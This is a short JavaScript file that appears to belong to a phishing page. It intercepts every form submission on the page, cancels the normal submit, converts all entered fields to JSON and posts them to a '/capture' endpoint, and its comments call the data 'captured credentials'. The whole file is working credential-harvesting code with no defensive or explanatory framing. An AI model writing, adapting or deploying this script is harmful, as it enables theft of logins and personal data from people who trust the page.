// Save captured credentials.
function onCaptured(credentials) {
  fetch("/capture", {
    method: "POST",
    body: JSON.stringify(credentials),
    headers: {
      "Content-Type": "application/json",
    },
  });
}

// Capture forms.
document.addEventListener("DOMContentLoaded", () => {
  document.body.addEventListener("submit", (e) => {
    e.preventDefault();

    const form = e.target;
    const formData = new FormData(form);
    const jsonData = Object.fromEntries(formData.entries());
    onCaptured(jsonData);
  });
});
